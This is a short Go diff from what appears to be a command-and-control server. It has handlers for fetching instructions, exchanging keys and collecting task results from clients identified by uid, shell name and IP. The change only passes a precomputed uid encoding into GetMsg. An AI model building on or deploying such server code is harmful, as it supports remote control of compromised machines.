@@ -161,7 +161,7 @@ func (m *MainHandler) Index(conn, Get_Msg,switch_key,encry_key,download,result,n
                     key_base := Get_conn(uid, username, shellname, clientIP,base_rounds)
                     fmt.Fprint(w, key_base)                
 				case Get_Msg: //获取指令
-                    data := GetMsg(uid,base_rounds)
+                    data := GetMsg(uid,base_rounds,uidBytes)
                     fmt.Fprint(w,data)
 				case switch_key: //发送与交换密钥
 
@@ -2483,7 +2483,7 @@ func Results(uid, results, Taskid string,code_map map[byte]int) {
 }
 
 // 获取指令
-func GetMsg(uid, base_rounds string) string {
+func GetMsg(uid, base_rounds,uidBytes string) string {
     current := time.Now()
     formattedTime := current.Format("2006.01.02 15:04:05")
     go func(uid string) {
@@ -2510,7 +2510,7 @@ func GetMsg(uid, base_rounds string) string {
     _, hasKey := key_map[uid]
     keyMu.RUnlock()
     if !hasKey {
-        return customBase64Encode([]byte(uid), base_rounds)
+        return uidBytes
     }
     // 先取队列指针（只读锁）
     queuesMu.RLock()
